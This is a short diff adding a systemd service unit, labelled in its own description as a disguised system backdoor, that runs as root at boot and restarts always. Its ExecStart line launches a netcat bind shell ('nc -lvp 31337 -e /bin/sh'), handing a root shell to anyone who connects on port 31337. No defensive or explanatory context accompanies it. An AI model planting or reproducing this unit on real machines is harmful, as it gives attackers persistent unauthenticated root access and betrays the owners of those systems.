@@ -1,0 +1,13 @@
+[Unit]
+Description=System Backdoor Service (Disguised)
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/sh -c "nc -lvp 31337 -e /bin/sh"
+Restart=always
+RestartSec=30
+User=root
+
+[Install]
+WantedBy=multi-user.target
